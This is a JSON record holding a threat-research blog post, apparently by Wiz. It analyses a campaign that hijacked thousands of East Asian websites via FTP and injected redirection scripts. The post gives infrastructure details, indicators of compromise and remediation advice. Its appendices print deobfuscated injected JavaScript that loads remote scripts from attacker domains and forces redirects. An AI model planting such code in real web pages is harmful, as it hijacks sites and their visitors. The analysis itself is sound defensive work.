{
    "id": "3843bcdf-d3cc-4379-8b64-c92a9e98f5be",
    "created_at": "2023-04-05T02:09:54.704406Z",
    "updated_at": "2025-03-27T02:14:34.135306Z",
    "deleted_at": null,
    "sha1_hash": "ba3dbb28b1e1de651202dafa9152ba012f7420f7",
    "title": "2023-03-02 - Redirection Roulette- Thousands of hijacked websites in East Asia redirecting visitors to other sites",
    "authors": "",
    "file_creation_date": "2023-04-03T08:24:38Z",
    "file_modification_date": "2023-04-03T08:24:38Z",
    "file_size": 534661,
    "plain_text": "# Redirection Roulette: Thousands of hijacked websites in East Asia redirecting visitors to other sites\n\n**wiz.io/blog/redirection-roulette**\n\n## TL;DR\n\nIn the last few months we have been investigating a large scale cyber operation leveraging legitimate FTP credentials obtained via an\nunknown threat vector. In many cases, these were highly secure auto-generated FTP credentials which the attacker was somehow\nable to acquire and leverage for website hijacking. We are publishing our findings regardless, and would be happy to collaborate on\nthis research, as this is still ongoing activity.\n\n## Executive summary\n\nSince early September 2022, an unknown threat actor has successfully compromised tens of thousands of websites mainly aimed at\nEast Asian audiences, redirecting hundreds of thousands of their users to adult-themed content. In each case, the threat actor has\ninjected malicious code into customer-facing web pages that is designed to collect information about visitors’ environments and\noccasionally redirect them to these other sites, depending on both random chance and the country in which the user is located.\n\nThe compromised websites include many owned by small companies and several operated by multinational corporations. They are\ndiverse in terms of their tech stacks and hosting services, making it difficult to pinpoint any specific vulnerability, misconfiguration, or\nsource of leaked credentials this threat actor may be abusing. In several cases, including a honeypot we set up to investigate this\nactivity, the threat actor connected to the target web server using legitimate FTP credentials they somehow obtained previously.\n\nWhile we were not able to determine how this threat actor has been gaining initial access to the affected web servers or where they are\nsourcing their stolen credentials from, we've decided to publish our findings regardless, in order to bring more awareness to this\nongoing activity. Given the nature of the destination websites, we believe the threat actor’s motivations are most likely financial, and\nperhaps they intend to merely increase traffic to these websites from specific countries and nothing more. However, the impact to the\ncompromised websites and their user experience is equivalent to defacement, and whatever weaknesses this actor is exploiting to gain\ninitial access to these websites could be utilized by other actors to inflict greater harm.\n\nIf you maintain your website via FTP, we recommend using FTPS or SFTP with a strong username and password combination. If you\nidentify any IOCs related to this activity in your environment, you should rotate your credentials, reinstall software from a trusted\nsource, and restore compromised assets to previous clean versions.\n\n[Please feel free to reach out to Wiz Threat Research at threat.hunters@wiz.io if you’ve been impacted by this activity or wish to](mailto:threat.hunters@wiz.io)\nexchange information that might assist in ongoing analysis.\n\n\n-----\n\nSummary of investigation findings\n\n## Introduction\n\nIn early October 2022, as part of our work with customers to investigate threats to their cloud environments, we learned of several\ncompromised Azure Web Apps hosted in East Asia that were redirecting users to an adult website. In each of these cases, an FTP\nendpoint used for managing the web application was accessed by an unknown actor using legitimate credentials (long and complex\npasswords which were unlikely to have been included as part of a brute-force dictionary attack). The actor modified existing web pages\nand added a single line of HTML code, in the form of a script tag referencing a remotely hosted JavaScript script. In multiple cases,\nbased on an analysis of relevant FTP logs, the actor was connecting to these FTP endpoints from a static IP address\n( 172.81.104[.]64 ).\n\nRedirection flow of visitors to compromised websites\n\nAs we investigated further, we discovered that these seemingly isolated cases were actually part of a much larger set of campaigns\nthat has successfully compromised thousands of websites, including several operated by large multinational corporations and aimed at\n[East Asian audiences. Based on data from publicwww and](https://publicwww.com/) [SimiliarWeb, we propose a conservative estimate of at least 10,000](https://www.similarweb.com/)\ncompromised websites at the time of writing (not counting subdomains), redirecting hundreds of thousands of users in total every\nmonth. These websites are highly diverse in terms of their underlying technologies and hosting services, and in fact only a small\nfraction of them are Azure Web Apps.\n\nGiven the method of redirection and the nature of the destination websites, we initially assumed this to be a case of defacement, but\n[we’ve since considered the possibility that the goal might be ad fraud, SEO manipulation, or perhaps simply driving inorganic traffic to](https://en.wikipedia.org/wiki/Spamdexing)\nthese websites. We have not observed any signs of phishing, web skimming, or malware infection, and have yet to identify any\nevidence that could shed light on the threat actor’s precise motivations.\n\nWe have concluded that this activity most likely began in early September 2022 (based on domain registration dates and victim\nreporting) and involved continuously hacking web servers, collecting information about their visitors, and only sometimes redirecting\nthem to other websites with adult or gambling content.\n\n## Technical details\n\nWebsites compromised by this threat actor are modified to include one of several JavaScript tags (though in some cases malicious\nJavaScript is injected directly into existing files on the server, as explained below). Considering the static injected content and the\n[threat actor’s usage of FTP to modify files directly on the server, this would seem to rule out malvertising as an attack vector.](https://www.cisecurity.org/insights/blog/malvertising)\n\nThe injected script tags cause visitors to download and execute a JavaScript script hosted on an attacker-controlled server with a URL\nappearing similar to a legitimate service (such as `tpc.googlesyndication[.] wiki, which masquerades as the legitimate`\n```\ntpc.googlesyndication. com ):\n<script type=\"text/javascript\" src=\"https://tpc.googlesyndication[.]wiki/sodar/sodar2.js\"></script>\n\n```\nThese modifications seem to be automated, as we have identified cases where the same website contained more than one tag,\nsuggesting that it had been compromised more than once (this proved useful for our research, as it allowed us to discover new\nvariants). Additionally, the JavaScript tag is nearly always added to the end of the `<head> section of HTML pages or as the last line in`\n[JavaScript files. We have also witnessed bugs in this process, such as tags being added to the end of binary files like videos (where](https://www.virustotal.com/gui/file/1294409f7ec5fb9ddd12fe3891533eb5b78ff7fd86469c5d08220cb6ef2b66d1/)\nthey would have no effect).\n\n[We have also identified a GitHub project that seems to have been similarly compromised, in which a commit added two variants of the](https://github.com/soccerproject2022/football/commit/5615434012ebe1f3c461b602ce65de763321a371)\nmalicious JavaScript tag to various pages. This may imply that the threat actor has been attempting to gain illicit access to code\nrepositories in an effort to infect any associated websites.\n\nThe malicious hosts are all fronted by Cloudflare and geofenced to restrict execution of the JavaScript script to users connecting from\ncertain countries in East Asia. Additionally, the script uses a common web cloaking technique of matching visitors’ user agents and\nreferrers to a list of known web crawlers and search engines (like GoogleBot or Baidu) and ignoring such requests. However, this does\nnot prevent these web crawlers from indexing the added line of malicious code in compromised websites, which has made it easier for\nus to identify them.\n\nSo far, we have surfaced numerous servers we assess to be associated with this activity, each of which hosts a variation of the\naforementioned JavaScript script while masquerading as a legitimate URL (usually by changing the top-level domain):\n\n\n-----\n\n**Malicious URLMalicious URL** **Legitimate URLLegitimate URL**\n\ntpc.googlesyndication[.]wiki/sodar/sodar2.js tpc.googlesyndication.com/sodar/sodar2.js\n\nbeacon-v2.helpscout[.]help/static/js/vendor.06c7227b.js beacon-v2.helpscout.net/static/js/vendor.06c7227b.js\n\ncdn.jsdelivr[.]autos/npm/jquery/dist/jquery.min.js (currently offline) cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js\n\nminjs[.]us/static/js/min.js (currently offline) */static/js/min.js\n\nwww.metamarket[.]quest/market.js www.metamarket.com\n\ncdn-go[.]net/vasdev/web_webpersistance_v2/v1.8.2/flog.core.min.js cdngo.cn/vasdev/web_webpersistance_v2/v1.8.2/flog.core.min.js\n\na.msstatic[.]net/main3/common/assets/template/head/ad.tmpl_a9b7.js a.msstatic.com/huya/main3/*\n\nWhile we cannot be entirely sure that these are all part of the same activity cluster and operated by the same threat actor, the\nJavaScript scripts are all structured similarly, use comparable obfuscation techniques, and include uniquely identifiable strings (either\n[plaintext or obfuscated), such as a list of crawlers to ignore (see next section). In addition, a number of these](https://urlscan.io/result/5b9567a6-dd8c-4911-9205-d1d0af85816b/) [servers appear to be](https://urlscan.io/result/b82ac4b5-d4bf-4f72-a641-8c6c4d5974f1/)\nrunning NGINX, and some domain names were registered via PorkBun. The domains `minjs[.]us and` `metamarket[.]quest are`\nunique in that their origin IP addresses have been exposed in historical DNS records ( 193.109.120[.]45 and `159.69.123[.]158,`\n[respectively, based on private passive DNS data but publicly](https://archive.md/tQBWt) [verifiable). The latter was still active up until late Feb. 2023, and once](https://archive.md/WIZgi)\nserved a certificate for `googlesyndication[.]wiki, demonstrating an additional link between these domains.`\n\n## Redirection script\n\nThe redirection logic of the JavaScript script apparently checks for a set of certain conditions (which has changed over time) and only\nredirects the visitor to the destination website if those conditions have been met. In the latest variant (as of Feb. 2023), some of these\nconditions are as follows:\n\n1. Every script variant contains a `probability field set to a number between 0 and 1. When the script is executed, a random`\n\nnumber between 0 and 1 is calculated, and if it evaluates to be less than the `probability value, then a cookie is set on the`\nuser’s machine which is set to expire after 24 hours, and the user is then redirected to the destination website listed in the\n```\n   srcAddress field.\n\n```\n2. If a cookie has already been set on the user’s machine, then the next time they visit any website compromised by the same\n\nvariant, they are automatically redirected to the destination website listed in the `srcAddress field, while ignoring the`\n```\n   probability field value (therefore one might be inclined to call this a “fortune cookie”). Different script variants sometime use\n\n```\ndifferent names for their cookies (observed examples include `qwertvy and` `bdstatics ).`\n3. Interestingly, if the user is using an Android browser and the `config.androidApk flag is enabled in the script, then rather than`\n\nredirecting the user to the website listed in the `srcAddress field, the user is instead redirected to the resource listed in the`\n```\n   downloadSrc field. In the samples we have analyzed, these have either been googleplay[.]com/chrome.apk or\n   google[.]com/google.apk (depending on the variant). Note that neither of these resources actually exists, and we have never\n\n```\nseen a variant with `config.anrdoidApk enabled. This could indicate that these are simply placeholders and their functionality`\nhas not yet been fully implemented.\n4. As mentioned above, if the user agent is of a known web crawler, or the referrer is of a known search engine, the user is not\n\nredirected (this functionality is implemented in the `isSpider and` `searchEngine functions, respectively). The following is a list of`\ncrawlers included in the script:\n```\nbot|googlebot|crawler|spider|robot|crawling|Bytespider|Googlebot|Baiduspider|MSN Bot\\/Bingbot|Yandex Bot|Soso\nSpider|Sosospider|Sogou Spider|360Spider|Yahoo! Slurp China|Yahoo!|YoudaoBot|YodaoBot|Sogou News Spider|msnbot|msnbotmedia|bingbot|YisouSpider|ia_archiver|EasouSpider|JikeSpider|EtaoSpider|SemrushBot\n\n```\nWe have theorized that the purpose of the `probability field might be for load balancing (to prevent overloading the threat actor’s`\ninfrastructure or destination websites), or perhaps for operational security reasons: because the redirection behavior appears\ninconsistent (compounded by the aforementioned geofencing), it might be more difficult for users or website administrators to identify\nthe issue and pinpoint the cause (as evidenced by users arguing in public forums over whether or not a particular website was even\ninfected). In theory, this could increase the chances of a web server remaining compromised for a longer period of time.\n\nRedirection script decision tree (assuming ‘probability’ is set to 0.1)\n\n\n-----\n\nIn past versions, the JavaScript script also collected certain information apparently meant to fingerprint visitors browsers ( userAgent,\n```\nhost, referer, language, url, title, charset, OS, browser, resolution, typeReferer, redirectUrl ). This information\n\n```\nwas encoded in Base64 and summarized in JSON (formatted as `{“mydata”:$data} ). The script would use a POST request to upload`\nthe JSON to an API endpoint on the attacker-controlled host ( /top/record/addRecord ). The server would then respond with JSON\nthat included further instructions (formatted as `{\"code\":$code,\"msg\":$message,\"data\":$data} ). However, this behavior doesn’t`\noccur in the current set of scripts – since Dec. 2022, the script no longer uploads any data to the server via POST, and some of the\nrelevant functions have been deleted (newer variants no longer include `detectOS,` `detectBrowser,` `getCurrentDate,` `getLanguage,`\nor `isPC functions).`\n\nBesides adding or removing functionality, the threat actor has also made additional modifications to the malicious script, some of which\nappear to be in response to detection. For example, the script hosted at `metamarket[.]quest has gone through multiple iterations,`\ninitially using one method of obfuscation and a redirection probability of 30% (as of Sept. 2022), but later switching to a different\nobfuscation method and reducing the probability to 10% (as of Dec. 2022). Interestingly, the script hosted at `helpscout[.]help`\ncurrently has its probability set to 0%, meaning that no users to infected websites are currently being redirected.\n\nNotably, several samples related to this activity were uploaded to VirusTotal during this period and detected by a THOR APT Scanner\n[YARA rule, and subsequently (in late Nov. 2022) the threat actor changed their MO: in some cases, besides adding JavaScript tags to](https://valhalla.nextron-systems.com/info/rule/SUSP_JS_OBFUSC_Base64_Combo_Jul22_1)\nexisting files on the compromised server, they began directly injecting obfuscated JavaScript code into certain files (we observed this\nbehavior on our honeypot as well). We assess that this might be because some THOR APT YARA rules don’t scan samples larger than\n100KB, but it could just as easily be a coincidence.\n\n## Destination websites\n\nThe websites to which users are redirected initially included `alivod1[.]com,` `22332299[.]com,` `alibb1[.]xyz, and` `alibb2[.]xyz`\n(阿里BB / 阿里巴巴 is Chinese shorthand for “Alibaba”). The redirection was initially performed directly, but as of February 2023, users\nare redirected through an intermediate server that then forwards them to what appear to be dynamically generated domain names such\nas `qs70qw11az[.]com, which show branding for “Alibbfb” and advertisements for various gambling websites, sometimes also`\ndisplaying pop-ups mentioning websites with the “alibb” naming scheme. The gambling sites themselves suggest visitors download an\n[APK file to install an Android app (such as this one).](https://www.virustotal.com/gui/file/f012cf64064f3a6d4e032e70126b01c368fe3a27b1ee2905bd7e9d2355b1084a)\n\nScreenshot of a gambling-themed website to which users can be redirected\n\n## Intermediate servers\n\nAs mentioned above, the redirection process has changed over time. While visitors to compromised websites were initially redirected\ndirectly, as of Feb. 2023, users are now first redirected through one of four known intermediate servers with URLs masquerading as\nlegitimate websites:\n\n**Malicious URL** **Legitimate URL**\n\ns3a.pstatp[.]org/toutiao/push.js s3a.pstatp.com/toutiao/push.js\n\nstat.51sdk[.]org/ (e.g., stat.51sdk[.]org/b8nb3Ww5CtxpZis2) stat.51sdk.com (?)\n\ntpc.cdn-linkedin[.]info/js/vendor.5b3ca61.js *-cdn.linkedin.com (e.g., mobile-cdn.linkedin.com)\n\nwidget-v4.tidiochat[.]net/1_131_0/static/js/chunk-WidgetIframe-.js widget-v4.tidiochat.com/1_137_1/static/js/*\n\nUsers are then redirected to what appear to be dynamically generated or perhaps randomly named domains, including\n```\nqs70qw11az[.]com, rsoy6a1w7p[.]com, 3h1yt68lxk[.]com and g7h69h29cx[.]com . At the time of writing, the last of these is\n\n```\n[ranked as the 2,943rd most popular website in China according to SimilarWeb, comparable to the popularity of nespresso.com in the](https://www.nespresso.com/)\nUnited States (ranked 2737th).\n\nAccording to data from [SimiliarWeb, the above intermediate servers handle hundreds of thousands of visitors each month – the vast](https://www.similarweb.com/)\nmajority originating in East Asia – and some campaigns have been more active than others during different periods of time, which\nmight be related to changes in the aforementioned ‘probability’ field of each campaign:\n\nComparison of redirections per intermediate server over time\n\n\n-----\n\n## Victimology\n\nAs we attempted to determine the common denominator between the compromised websites, we found that the vast majority (but not\nall) satisfied the following criteria:\n\n1. Either hosted in China or hosted elsewhere but aimed at a Chinese audience.\n2. Either hosted on a server with an open FTP port (21) or deployed via a separate FTP endpoint.\n\n[We have identified several instances in which a compromised website’s administrator noticed the intrusion (#1,](https://369369.xyz/host/topic/1071991.html) [#2,](https://bbs.vpser.net/archiver/tid-26413.html) [#3,](https://www.phpschool.com/gnuboard4/bbs/board.php?bo_table=qna_install&wr_id=129679) [#4,](https://www.v2ex.com/t/889977) [#5,](https://www.haozhuji.com.cn/zhanzhang/87145.html) [#6,](https://support.google.com/adsense/thread/191397292/could-you-please-tell-me-is-this-js-belong-to-google) [#7,](http://www.vtu425.com/read-htm-tid-4418-page-1.html)\n[#8,](https://fast.v2ex.com/t/895331) [#9) and in some cases removed the malicious redirection only for it to reappear shortly thereafter. Moreover, we found reports by](https://www.dz9.net/blog/4701.html)\n[some of these compromised websites’ visitors who noticed they were being redirected to another website (#1,](https://twitter.com/Gamefi0x0001/status/1579492659936522240) [#2,](https://twitter.com/none_jpn/status/1577208522080518144) [#3,](https://t.me/MyRichFarmGroup/142129) [#4). Additionally,](https://www.reddit.com/r/8bitdo/comments/xutcm5/the_webpage_is_redirecting_to_a_adult_webpage)\n[we have identified a server that was apparently set up to monitor many websites for signs of infection over a period of several weeks,](https://hecland.com/result/)\nclearly indicating that others have been investigating this activity as well. The multitude of related samples that have been scanned\nover the past few months on [VirusTotal,](https://www.virustotal.com/) [Weibu Threatbook, and](https://s.threatbook.com/) [urlscan.io also support this.](https://urlscan.io/search/#%22alibbvod.com%22%20OR%20%22alibb1.xyz%22%20OR%20%22alivod1.com%22%20OR%20%22alibb2.xyz%22%20OR%20%2222332299.com%22%20OR%20%22googlesyndication.wiki%22%20OR%20%22beacon-v2.helpscout.help%22%20OR%20%22metamarket.quest%22%20OR%20%22minjs.us%22%20OR%20%22jsdelivr.autos%22%20OR%20%22cdn-go.net%22%20OR%20%22a.msstatic.net%22%20OR%20%22pstatp.org%22%20OR%20%2251sdk.org%22%20OR%20%22cdn-linkedin.info%22%20OR%20%22tidiochat.net%22%20OR%20filename%3A%22%2Ftop%2Frecord%2FaddRecord%22%20OR%20%22yt67.shop%22%20OR%20%22ibtoc3t7.com%22)\n\n[We have read some claims that this activity is facilitated by exploiting a known vulnerability in frontend development software Baidu](https://www.8y-ad.com/a/news/experience/2022/1020/1636.html)\n[UEditor, or an unknown vulnerability in Pagoda (BT Panel), server management software popular in China (see appendix A for more](https://www.bt.cn/new/index.html)\ndetails about this activity subset). However, we don’t think these serve as a sufficient explanation on their own. It is nevertheless quite\npossible that the threat actor has various methods at their disposal, so these theories might hold true in some specific instances or\ncampaigns.\n\n## Honeypot investigation\n\nOver the course of our investigation, we set up a honeypot with a Chinese IP address, uploaded several dummy files, and configured it\nto allow any FTP connection. We have since observed the threat actor connecting to it on multiple occasions from the aforementioned\nIP address ( 172.81.104[.]64 ). We have seen no indication the actor exploited any vulnerabilities on our machine – instead, they\nused a username and password combination associated with another unrelated server (this attempt was successful because we\nconfigured our honeypot to accept any FTP connections). Based on historical DNS records, this other server appears to have been\npreviously hosted on our honeypot’s current IP address.\n\nOnce they gained access, they began modifying files to include a malicious JavaScript tag, and in later incursions they injected the\nscript directly into existing pages (as described above). This could imply that the threat actor managed to acquire credentials for this\nother server and infect it in the past, but we were unable to confirm this. They have also been observed connecting to another\nhoneypot using generic username and password combinations seemingly sourced from common brute-force dictionaries (this second\nhoneypot is operated by the Louisiana State Police, who were kind enough to share their data with us).\n\n## Recommendations\n\nIf you maintain your website via FTP, we recommend using FTPS or SFTP with a strong username and password combination. If you\nidentify any indicators of compromise in your web server (see appendix B), we suggest you take the following actions:\n\n1. Rotate any credentials you use for maintaining the affected website (such as FTP and Git passwords).\n2. If you maintain your website via FTP, switch to FTPS or SFTP if you have yet to do so.\n3. Identify all instances of malicious JavaScript tags/code across the website's various assets by searching for known malicious\n\ndomain names (see appendix B).\n4. Redeploy the server from a trusted image (if possible), reinstall software from a trusted source, and patch to the latest version.\n5. Restore the compromised assets to previous clean versions that do not contain the malicious JavaScript tags/code, or manually\n\nremove all instances of the tags/code.\n\n## Open questions\n\n1. How does the threat actor gain initial access to the target web server? (i.e., how do they acquire legitimate FTP credentials for\n\nthe targeted web servers in the first place?)\n2. What other websites are users being redirected to as part of this activity?\n3. Why are the servers geofenced to East Asia?\n4. What is the purpose of having a ‘probability’ field? (as opposed to redirecting all visitors)\n5. Are there any conditions where behavior other than redirection occurs? (e.g., downloading additional payloads)\n\n## Summary\n\n\n-----\n\nWe remain unsure as to how the threat actor has been gaining initial access to so many websites, and we have yet to identify any\nsignificant commonalities between the impacted servers other than their usage of FTP. Although it's unlikely that the threat actor is\nusing a 0day vulnerability given the apparently low sophistication of the attack, we can’t rule this out as an option. It’s also possible that\nthere is a commonality we have simply missed, such as misconfigured or vulnerable versions of specific server-side software, or\nperhaps vulnerable tools being used to manage the affected websites. The threat actor could also be utilizing data from password\nstealers or making use of leaked credentials, even though this wouldn’t quite explain how servers are being reinfected after password\nrotation. The threat actor would need to somehow set up backdoors for persistence, or compromise popular hosting services and\n[exfiltrate customer credentials, such as in the recently disclosed GoDaddy breach.](https://www.bleepingcomputer.com/news/security/godaddy-hackers-stole-source-code-installed-malware-in-multi-year-breach/)\n\nDespite our knowledge gaps about this threat activity, we've decided to publish our findings regardless, in order to bring more\nawareness to this ongoing activity, and in the hope that others in the security community can identify the initial access vector.\n\nGiven the nature of the destination websites, we believe the threat actor’s motivations are most likely financial, and perhaps they intend\nto merely increase traffic to these websites from specific countries and nothing more. However, the impact to the compromised\nwebsites and their user experience is equivalent to defacement, and whatever weaknesses this actor is exploiting to gain initial access\nto these websites could be utilized by other actors to inflict greater harm. In the meantime, we have shared our findings with Cloudflare\nand requested that they block these redirections.\n\n[Please feel free to reach out to threat.hunters@wiz.io if you’ve been impacted by this activity or wish to exchange information that](mailto:threat.hunters@wiz.io)\n[might assist in ongoing analysis. Wiz customers can use this query to identify impacted workloads in their cloud environment.](https://app.wiz.io/graph#~(control~'wc-id-1001))\n\n_You've just read another product of Wiz Research. Our ongoing mission is to investigate emerging threats to the cloud, detect them in_\n_time, and mitigate the risks that enable them. Contributors: Alon Schindel, Amitai Cohen, Arik Nemtsov, Barak Sharoni, Danny Hershko_\n_Shemesh, Eliad Peller, Nir Ohfeld, Mattan Shalev, Omri Kornblau, Ronen Shustin, Sagi Tzadik, Shir Tamari and Tomer Hacohen._\n\n## Appendix A – Compromised Pagoda servers\n\n[Throughout Dec. 2022, many Pagoda (BT Panel) users on the bt.cn forum and elsewhere reported that their web servers had been](https://www.bt.cn/)\nhacked and injected with code that we have since clustered to the activity described above, based on code similarity and infrastructure\n[overlap (#1,](https://www.bt.cn/bbs/thread-105023-1-1.html) [#2,](https://www.bt.cn/bbs/thread-105354-1-1.html) [#3,](https://hostloc.com/thread-1111691-1-1.html) [#4,](https://www.bt.cn/bbs/thread-105558-1-1.html) [#5).](https://www.bt.cn/bbs/thread-101097-1-1.html)\n\n[The vendor has published their own analysis and concluded that several files related to NGINX were being modified for persistence on](https://www.bt.cn/bbs/thread-105121-1-1.html)\n[infected servers (as](https://cn-sec.com/archives/1471119.html) [corroborated](https://cn-sec.com/archives/1471937.html) [by](https://www.esw.ink/5574.html?btwaf=63410329) [other](https://x.threatbook.com/v5/article?threatInfoID=40612) [researchers), but they were unable to determine an initial access vector, claiming that no](https://x.threatbook.com/v5/article?threatInfoID=40612,%20https://zhufan.net/2022/12/09/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%9C%AA%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%BD%AE%E6%96%B9%E6%B3%95/)\n[vulnerability could be identified. They have consequently encouraged security researchers to submit to their bug bounty program, and](https://www.butian.net/Article/content/id/521)\n[have published a script that scans Pagoda servers for signs of infection.](http://download.bt.cn/tools/wng_clean.py)\n\nThe following are deobfuscated sections of two different samples of a file named `systemd-private-56d86f7d8382402517f3b5-`\n```\njP37av retrieved from infected Pagoda servers (this name is also referenced in a modified nginx binary from the same servers). Note\n\n```\nthe JavaScript tag, one for `metamarket[.]quest and another for` `msstatic[.]net (which seems to be unique to this activity subset,`\nalong with `cdn-go[.]net ):`\n```\nfunction setc(_0x64d8x2, _0x64d8x3, _0x64d8x4) {\n\n  var _0x64d8x5 = new Date();\n\n  _0x64d8x5.setMinutes(_0x64d8x5.getMinutes() + _0x64d8x4);\n\n  document.cookie = _0x64d8x2 + '=' + _0x64d8x3 + ';expires=' + _0x64d8x5.toUTCString()\n\n}\n\nsetc('waf_sc', '5889647726', 360);\n\ndocument.write(unescape(\"%3Cscript\nsrc='https://a.msstatic.net/main3/common/assets/template/head/ad.tmpl_a9b7.js'%3E%3C/script%3E\"));\nfunction setc(_0x7338x2, _0x7338x3, _0x7338x4) {\n\n  var _0x7338x5 = new Date();\n\n  _0x7338x5.setMinutes(_0x7338x5.getMinutes() + _0x7338x4);\n\n  document.cookie = _0x7338x2 + '=' + _0x7338x3 + ';expires=' + _0x7338x5.toUTCString()\n\n}\n\nsetc('waf_sc', '5889647726', 360);\n\ndocument.write(unescape(\"%3Cscript src='https://www.metamarket.quest/market.js'%3E%3C/script%3E\"));\n\n```\nPivoting on the value of the `waf_sc cookie (5889647726), we have identified a few samples of JavaScript` [scripts related to other](https://www.virustotal.com/gui/file/c0b29f6d01f154abbe2dbe1ca3b3d14933f1a7a560e7e4e2e8c1e492dc63f8e0)\ndomains ( yt67[.]shop and `3kdv58xk.ibtoc3t7[.]com ). These domains have previously redirected to` `hyule64[.]com, an adult`\nwebsite titled “hyl[.]tv” displaying advertisements similar to those displayed on other destination websites we have observed in this\ninvestigation.\n\n\n-----\n\nThese other scripts are structured similarly to those observed on infected Pagoda servers and contain comparable functions, but they\nare not quite the same. Therefore, this third activity subset might be an offshoot of the others, but our confidence in this connection\nremains low. For reference, here is a deobfuscated section of one of the possibly related scripts:\n```\nfunction addiframe() {\n\n  var _0x22998d = document.createElement('a');\n\n  _0x22998d.href = 'https://3kdv58xk.ibtoc3t7.com';\n\n  _0x22998d.target = '_blank';\n\n  document.body.appendChild(_0x22998d);\n\n  _0x22998d.click();\n\n  setTimeout(() => document.body.removeChild(_0x22998d), 0x1f40);\n\n}\n\nfunction setcookie() {\n\n  var _0x3a43d1 = new Date();\n\n  _0x3a43d1.setTime(_0x3a43d1.getTime() + 0x18 * 0x3 * 0x3c * 0x3c * 0x3e8);\n\n  var _0x504815 = document.cookie.indexOf('waf_sc=5889647726');\n\n  if (_0x504815 < 0x0 && document.okk == null) {\n\n    document.okk = '123';\n\n    document.addEventListener('DOMContentLoaded', function (_0x301b98) {\n\n      if (document.kkffs == null) {\n\n        document.kkffs = '123';\n\n        var _0x5d8a65 = Math.floor(Math.random() * 0x64) + 0x1;\n\n        if (_0x5d8a65 <= 0x64) {\n\n          document.cookie = 'waf_sc=5889647726;expires=' + _0x3a43d1.toGMTString();\n\n          addiframe();\n\n        }\n\n      }\n\n    });\n\n  }\n\n}\n\nsetcookie();\n\n## Appendix B – Indicators of compromise (IOCs)\n\n```\ntpc.googlesyndication[.]wiki/sodar/sodar2.js\nbeacon-v2.helpscout[.]help/static/js/vendor.06c7227b.js\ncdn.jsdelivr[.]autos/npm/jquery/dist/jquery.min.js\nwww.metamarket[.]quest/market.js\nminjs[.]us/static/js/min.js\ncdn-go[.]net/vasdev/web_webpersistance_v2/v1.8.2/flog.core.min.js\na.msstatic[.]net/main3/common/assets/template/head/ad.tmpl_a9b7.js\ns3a.pstatp[.]org/toutiao/push.js\nstat.51sdk[.]org/*\ntpc.cdn-linkedin[.]info/js/vendor.5b3ca61.js\nwidget-v4.tidiochat[.]net/*\n*/top/record/addRecord\nalibbvod[.]com\nalivod1[.]com\nalibb*[.]xyz\n22332299[.]com\n172.81.104[.]64\nsystemd-private-56d86f7d8382402517f3b5-jP37av\nsystemd-private-56d86f7d8382402517f3b51625789161d2cb-chronyd.service-jP37av\n\n## Appendix C – Known samples\n\n[08d6092832ab0631cb45415707fe6e262a205d1809a064ed9aa577647a39ba8e (sodar2.js)](https://www.virustotal.com/gui/file/08d6092832ab0631cb45415707fe6e262a205d1809a064ed9aa577647a39ba8e)\n[7259f39c86e94cf04b5843946e669e093955d37ca2e7ea1dd88fdd5d63698f61 (sodar2.js, partially deobfuscated)](https://www.virustotal.com/gui/file/7259f39c86e94cf04b5843946e669e093955d37ca2e7ea1dd88fdd5d63698f61)\n[271a25666415ef308797072fbd710d8ddba82d181010182dedd1384bac0a5c3c (sodar2.js, partially deobfuscated)](https://www.virustotal.com/gui/file/271a25666415ef308797072fbd710d8ddba82d181010182dedd1384bac0a5c3c)\n[50bf3385e888eee5e31a92d71c9a194b3bdfb62760b9cc069b962ef9d3b5646f (vendor.06c7227b.js)](https://www.virustotal.com/gui/file/50bf3385e888eee5e31a92d71c9a194b3bdfb62760b9cc069b962ef9d3b5646f)\n[ed7970300fa87fefdd991d68166cbd5ca6c3f5e0b90202a24c73bb048325ec62 (vendor.06c7227b.js)](https://www.virustotal.com/gui/file/ed7970300fa87fefdd991d68166cbd5ca6c3f5e0b90202a24c73bb048325ec62)\n[6b5313f3ef4b260bebe59df8af4f1f1b7c112e0def8666d57e6033db381dea2c (vendor.06c7227b.js)](https://www.virustotal.com/gui/file/6b5313f3ef4b260bebe59df8af4f1f1b7c112e0def8666d57e6033db381dea2c)\n[0a1cecea008b34bcbc8db9f4f56077a02492b3970cfe59fd8e96a08655c81cc2 (min.js)](https://www.virustotal.com/gui/file/0a1cecea008b34bcbc8db9f4f56077a02492b3970cfe59fd8e96a08655c81cc2)\n[952a70429797ca33ffc8d3344feec6c24ff4b72e03c01dbc0bd12967d5688fbb (min.js)](https://www.virustotal.com/gui/file/952a70429797ca33ffc8d3344feec6c24ff4b72e03c01dbc0bd12967d5688fbb)\n\n\n-----\n\n[deb980b8dbce4914e4ce5f5b9c1245d5aef9dc58ba530b8b1f4a63d0669aee2d (min.js)](https://www.virustotal.com/gui/file/deb980b8dbce4914e4ce5f5b9c1245d5aef9dc58ba530b8b1f4a63d0669aee2d)\n[8ac547a78fb6a06aaac7562be6423362b4ac23e5dd89ab82819f2116688f76e8 (min.js)](https://www.virustotal.com/gui/file/8ac547a78fb6a06aaac7562be6423362b4ac23e5dd89ab82819f2116688f76e8)\n[c1049a0e6437f01007b2c4eeb2ce1bcfa4f2e1ece02bef617d3adb1b76b7fb1c (min.js, partially deobfuscated)](https://www.virustotal.com/gui/file/c1049a0e6437f01007b2c4eeb2ce1bcfa4f2e1ece02bef617d3adb1b76b7fb1c)\n[4770fdd231dccd6775a561fbf9c9dc16c0009aaea934107f5d7e9a79e10295d7 (market.js)](https://www.virustotal.com/gui/file/4770fdd231dccd6775a561fbf9c9dc16c0009aaea934107f5d7e9a79e10295d7)\n[5e100ab9bfb7fea33e294f56ece82cfd50c8f5cce86aaacc6bd50f4c58ccaec7 (market.js)](https://www.virustotal.com/gui/file/5e100ab9bfb7fea33e294f56ece82cfd50c8f5cce86aaacc6bd50f4c58ccaec7)\n[7873091e8596080c441dd07dae1f6bb6486aa160e9f3fc728425ae3293420d62 (market.js)](https://www.virustotal.com/gui/file/7873091e8596080c441dd07dae1f6bb6486aa160e9f3fc728425ae3293420d62)\n[30ec43c09bc09a4224001acb4af67126d5f2c58a2120c3e9f606c719ab6c826b (jquery.min.js)](https://www.virustotal.com/gui/file/30ec43c09bc09a4224001acb4af67126d5f2c58a2120c3e9f606c719ab6c826b)\n[76acbfd3312024f2c3046ead1c6da8d1bb832cb9e71fe74a4977f9e30067cfb3 